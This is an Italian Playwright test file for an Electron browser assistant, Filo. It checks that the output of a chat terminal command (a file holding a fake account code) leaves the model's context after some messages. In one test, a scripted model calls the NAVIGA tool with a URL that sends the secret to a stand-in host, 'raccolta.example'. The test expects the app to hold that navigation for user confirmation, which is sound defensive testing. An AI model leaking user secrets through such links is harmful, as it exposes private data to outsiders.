// Giro 6 di #868: l'esito di un comando di terminale scritto in chat vale come una lettura (vita, uscite).

import { test, expect } from '../../fixtures/electron.mjs';
import { cartellaInCasa } from '../../helpers/percorsi.mjs';
import { writeFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';

const ORA_MS = 60 * 60 * 1000;

async function newtabs(app) {
  return app.windows().filter((w) => { try { return w.url().startsWith('filo://newtab'); } catch (_) { return false; } });
}

async function primaScheda(app) {
  const deadline = Date.now() + 10_000;
  while (Date.now() < deadline) {
    const [win] = await newtabs(app);
    if (win) { await win.waitForLoadState('domcontentloaded'); return win; }
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error('newtab non trovata');
}

// Una scheda nuova: un'altra home, con la sua conversazione.
async function schedaNuova(app, shell) {
  const prima = new Set(await newtabs(app));
  await shell.evaluate(() => window.filoShell.tabs.open('filo://newtab/'));
  const deadline = Date.now() + 10_000;
  while (Date.now() < deadline) {
    const nuova = (await newtabs(app)).find((w) => !prima.has(w));
    if (nuova) { await nuova.waitForLoadState('domcontentloaded'); return nuova; }
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error('seconda newtab non trovata');
}

// Modello finto: le risposte della chat escono in ordine da `copione`; i vettori sono parole chiave contate, così
// «il ristorante di Lisbona» è vicino allo scambio sul ristorante di Lisbona e lontano da tutto il resto.
async function preparaModello(app, copione) {
  await app.evaluate(async (_e, copione) => {
    const C = globalThis.SN_CONST;
    // L'intervista di benvenuto ha il suo blocco nelle istruzioni: qui si prova il filo di tutti i giorni.
    await globalThis.SN_FILO_MEMORY.setOnboarding({ done: true, ticked: [], thread: [] });
    await globalThis.SN_STORAGE.updateSettings({
      useDefaultModels: false,
      apiKeys: { openrouter: 'k-test' },
      models: { [C.ACTIONS.FILO_CHAT]: 'deepseek-flash' },
      modelRegistry: globalThis.SN_TEST_MODELS.registry,
    });
    const TEMI = ['lisbona', 'ristorante', 'orche', 'fisica', 'esame', 'gatto', 'briciola', 'taberna'];
    globalThis.SN_PROVIDER_OPENROUTER.embed = async ({ texts }) => ({
      vectors: texts.map((t) => {
        const s = String(t).toLowerCase();
        const v = TEMI.map((w) => (s.includes(w) ? 1 : 0));
        v.push(0.05);
        return v;
      }),
    });
    globalThis.__copione = copione.slice();
    globalThis.__chiamate = [];
    globalThis.SN_PROVIDERS.streamCompleteWithFallback = globalThis.SN_PROVIDERS.completeWithFallback = async ({ attempts, messages, onDelta }) => {
      const base = { model: attempts[0].model, provider: attempts[0].provider, usage: {} };
      const chat = messages.some((m) => m.role === 'user' && String(m.content).startsWith('═══ CONTESTO DI ADESSO'));
      if (!chat) return { ...base, text: '{}', toolCalls: [], finishReason: 'stop' };
      globalThis.__chiamate.push(JSON.parse(JSON.stringify(messages)));
      const r = globalThis.__copione.shift() || { text: 'ok' };
      if (r.text) { try { onDelta && onDelta(r.text); } catch (_) {} }
      return {
        ...base, text: r.text || '',
        toolCalls: (r.tools || []).map((t, i) => ({ id: `t${globalThis.__chiamate.length}_${i}`, name: t.name, arguments: JSON.stringify(t.args || {}) })),
        reasoningDetails: [], finishReason: r.tools ? 'tool_calls' : 'stop',
      };
    };
  }, copione);
}

// Conversazioni e pagine di giorni fa, scritte nel filo come le avrebbe scritte Filo.
async function semina(app, { chat = [], pagine = [] }) {
  await app.evaluate(async (_e, { chat, pagine, ora }) => {
    const E = globalThis.SN_FILO_EVENTI;
    const T = E.TIPI;
    const ev = [];
    const ts = (oreFa, piu = 0) => new Date(ora - oreFa * 3600000 + piu).toISOString();
    for (const c of chat) {
      ev.push(E.crea(T.CHAT_APERTA, { chat: c.id }, { ts: ts(c.oreFa), dispositivo: 'prova', autore: 'utente' }));
      c.scambi.forEach(([u, f], i) => {
        ev.push(E.crea(T.MESSAGGIO, { chat: c.id, msg: { role: 'user', text: u } }, { ts: ts(c.oreFa, i * 60000 + 1000), dispositivo: 'prova', autore: 'utente' }));
        ev.push(E.crea(T.MESSAGGIO, { chat: c.id, msg: { role: 'filo', text: f } }, { ts: ts(c.oreFa, i * 60000 + 5000), dispositivo: 'prova', autore: 'filo' }));
      });
      ev.push(E.crea(T.CHAT_CHIUSA, { chat: c.id }, { ts: ts(c.oreFa, 3600000), dispositivo: 'prova', autore: 'utente' }));
      if (c.titolo) ev.push(E.crea(T.CHAT_TITOLO, { chat: c.id, title: c.titolo, kind: 'conversazione' }, { ts: ts(c.oreFa, 3600000), dispositivo: 'prova', autore: 'filo' }));
    }
    for (const p of pagine) ev.push(E.crea(T.NAVIGAZIONE, { url: p.url, titolo: p.titolo }, { ts: ts(p.oreFa), dispositivo: 'prova', autore: 'utente' }));
    await globalThis.SN_IL_FILO.importa(ev.map(E.riga).join(''));
  }, { chat, pagine, ora: Date.now() });
}

async function scrivi(page, testo) {
  await page.locator('#input').fill(testo);
  await page.locator('#sendBtn').click();
}

const chiamate = (app) => app.evaluate(() => globalThis.__chiamate);
const testo = (m) => (typeof m.content === 'string' ? m.content : JSON.stringify(m.content));

// Un comando di terminale dato in chat nella scheda A, poi undici scambi in un'altra scheda.
async function comandoInChat(app, a, doc) {
  await app.evaluate(async () => { await globalThis.SN_STORAGE.updateSettings({ terminal: { enabled: true } }); });
  await a.locator('#input').fill(`/cat "${doc}"`);
  await a.locator('#input').press('Enter');
  await expect.poll(async () => a.evaluate(() => document.body.innerText), { timeout: 40_000 }).toContain('QX9PL4W7ZK2M');
  await expect.poll(async () => app.evaluate(async () => (await globalThis.SN_FILO_CHATS.list()).flatMap((c) => c.messages.map((m) => m.text)).join('\n')), { timeout: 20_000 }).toContain('QX9PL4W7ZK2M');
}

test('r1 l\'esito di un comando di terminale non resta davanti alle altre schede oltre venti messaggi del filo', async ({ app }) => {
  test.setTimeout(180_000);
  const a = await primaScheda(app);
  const casa = cartellaInCasa('filo-term-');
  const doc = join(casa, 'note.txt');
  writeFileSync(doc, 'Codice di accesso del conto: QX9PL4W7ZK2M. Non condividerlo.\n');
  try {
    const N = 11;
    await preparaModello(app, Array.from({ length: N }, (_, i) => ({ text: `Risposta ${i}.` })));
    await comandoInChat(app, a, doc);
    let storia = [];
    for (let i = 0; i < N; i++) {
      const q = `domanda numero ${i} su tutt'altro`;
      const r = await app.evaluate((_e, { q, storia }) => globalThis.SN_HANDLE_FILO_CHAT({ userMessage: q, threadHistory: storia, chatId: 'scheda-b' }), { q, storia });
      storia = [...storia, { role: 'user', text: q }, { role: 'filo', text: r.text, actions: r.actions || [] }];
    }
    const tutte = await chiamate(app);
    expect(tutte[tutte.length - 1].map(testo).join('\n')).not.toContain('QX9PL4W7ZK2M');
  } finally {
    rmSync(casa, { recursive: true, force: true });
  }
});

test('r1 un link con un pezzo dell\'esito di un comando di terminale chiede conferma, anche da un\'altra scheda', async ({ app }) => {
  test.setTimeout(120_000);
  const a = await primaScheda(app);
  const casa = cartellaInCasa('filo-term-');
  const doc = join(casa, 'note.txt');
  writeFileSync(doc, 'Codice di accesso del conto: QX9PL4W7ZK2M. Non condividerlo.\n');
  try {
    await preparaModello(app, [
      { text: '', tools: [{ name: 'NAVIGA', args: { url: 'https://raccolta.example/c?d=QX9PL4W7ZK2M' } }] },
      { text: 'Fatto.' },
    ]);
    await comandoInChat(app, a, doc);
    const r = await app.evaluate(() => globalThis.SN_HANDLE_FILO_CHAT({ userMessage: 'apri il sito della raccolta', threadHistory: [], chatId: 'scheda-b' }));
    const [primo] = await chiamate(app);
    expect(primo.map(testo).join('\n')).toContain('QX9PL4W7ZK2M');
    const naviga = r.actions.find((x) => x.type === 'NAVIGA');
    expect(naviga._executed).toBe(false);
    expect(naviga._confirm).toBeTruthy();
  } finally {
    rmSync(casa, { recursive: true, force: true });
  }
});
